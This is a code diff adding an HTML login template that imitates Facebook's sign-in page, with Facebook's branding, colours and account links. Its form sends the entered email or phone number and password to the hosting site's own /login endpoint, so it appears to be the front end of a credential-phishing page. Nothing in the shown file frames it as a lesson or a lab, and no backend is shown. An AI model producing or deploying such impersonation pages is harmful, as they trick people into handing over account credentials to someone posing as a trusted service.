@@ -1,0 +1,158 @@
+<!-- templates/login.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Facebook Login</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(to right, #dfe9f3, #ffffff);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .login-box {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+      width: 350px;
+      text-align: center;
+      animation: fadeIn 0.7s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .login-box h1 {
+      color: #1877f2;
+      font-size: 40px;
+      margin-bottom: 25px;
+      font-weight: 700;
+    }
+
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #ccd0d5;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: all 0.3s;
+    }
+
+    .login-box input:focus {
+      border-color: #1877f2;
+      outline: none;
+      box-shadow: 0 0 5px rgba(24, 119, 242, 0.3);
+    }
+
+    /* NEW: container for password + eye icon */
+    .password-wrapper {
+      position: relative;
+      width: 100%;
+      margin: 10px 0;
+    }
+
+    /* Adjust input padding for eye icon */
+    .password-wrapper input {
+      padding-right: 40px;
+      margin: 0;
+    }
+
+    /* Eye icon style */
+    .toggle-password {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 20px;
+      color: #888;
+      user-select: none;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(to right, #1877f2, #42a5f5);
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin-top: 10px;
+    }
+
+    .login-box button:hover {
+      background: linear-gradient(to right, #0e63d4, #2d9cdb);
+    }
+
+    .login-box a {
+      display: block;
+      margin-top: 15px;
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .login-box a:hover {
+      text-decoration: underline;
+    }
+
+    hr {
+      margin: 25px 0 15px;
+      border: none;
+      height: 1px;
+      background: #ddd;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <h1>facebook</h1>
+
+    <form action="/login" method="POST">
+      <input type="text" name="username" placeholder="Email or phone number" required>
+
+      <div class="password-wrapper">
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <span class="toggle-password" onclick="togglePassword()">👁️</span>
+      </div>
+
+      <button type="submit">Log In</button>
+    </form>
+
+    <a href="#">Forgotten password?</a>
+    <hr>
+    <a href="#">Create New Account</a>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const pwd = document.getElementById('password');
+      if (pwd.type === 'password') {
+        pwd.type = 'text';
+      } else {
+        pwd.type = 'password';
+      }
+    }
+  </script>
+
+</body>
+</html>
